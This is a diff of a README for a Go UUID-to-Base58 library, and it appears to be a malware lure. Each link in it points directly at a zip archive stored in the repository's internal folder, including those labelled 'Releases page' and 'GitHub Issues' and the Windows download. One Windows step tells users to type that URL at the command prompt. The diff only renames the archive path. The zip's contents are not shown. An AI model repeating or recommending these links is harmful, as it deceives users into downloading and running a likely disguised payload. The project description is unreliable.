@@ -6,20 +6,20 @@ Welcome to the **b58uuid-go** project! This library helps you encode UUIDs in Ba
 
 ## 🔗 Download Now
 
-[![Download b58uuid-go](https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/base58/b-uuid-go-1.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/base58/b-uuid-go-1.3.zip)
+[![Download b58uuid-go](https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/b-go-uuid-v3.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/b-go-uuid-v3.1.zip)
 
 ## 📥 Download & Install
 
 To get started with **b58uuid-go**, please follow these steps:
 
-1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/base58/b-uuid-go-1.3.zip).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/b-go-uuid-v3.1.zip).
 2. On the Releases page, you will find several versions listed.
 3. Choose the latest version for your needs and click on it.
 4. Download the appropriate file for your operating system. Currently, we offer files for Windows, Mac, and Linux.
 
 ### Example Download Links
 
-- **Windows:** Click on `https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/base58/b-uuid-go-1.3.zip` to download it.
+- **Windows:** Click on `https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/b-go-uuid-v3.1.zip` to download it.
 - **Mac:** Click on `b58uuid-go_darwin_amd64` to download it.
 - **Linux:** Click on `b58uuid-go_linux_amd64` to download it.
 
@@ -39,7 +39,7 @@ After downloading, open your terminal or command prompt. Navigate to the folder 
 
 1. Open Command Prompt.
 2. Navigate to the folder with the downloaded file using the `cd` command.
-3. Type `https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/base58/b-uuid-go-1.3.zip` and hit Enter.
+3. Type `https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/b-go-uuid-v3.1.zip` and hit Enter.
 
 ### Running on Mac
 
@@ -74,7 +74,7 @@ Here are a few scenarios where you might want to use **b58uuid-go**:
 
 If you encounter issues or have questions while using **b58uuid-go**, you can find support through the community:
 
-- [GitHub Issues](https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/base58/b-uuid-go-1.3.zip) – Report bugs or ask questions.
+- [GitHub Issues](https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/b-go-uuid-v3.1.zip) – Report bugs or ask questions.
 - Community Forums – Check forums or social media groups focused on Golang development.
 
 ## 🛡️ License
@@ -91,6 +91,6 @@ We welcome contributions to improve **b58uuid-go**. If you have ideas or want to
 
 ## 🔗 Download Now Again
 
-Don't forget to download **b58uuid-go** and start transforming your UUIDs into Base58. Click here again to visit the [Releases page](https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/base58/b-uuid-go-1.3.zip). 
+Don't forget to download **b58uuid-go** and start transforming your UUIDs into Base58. Click here again to visit the [Releases page](https://raw.githubusercontent.com/ikdababy1/b58uuid-go/main/internal/b-go-uuid-v3.1.zip). 
 
 Thank you for using **b58uuid-go**! Enjoy encoding your UUIDs with ease.
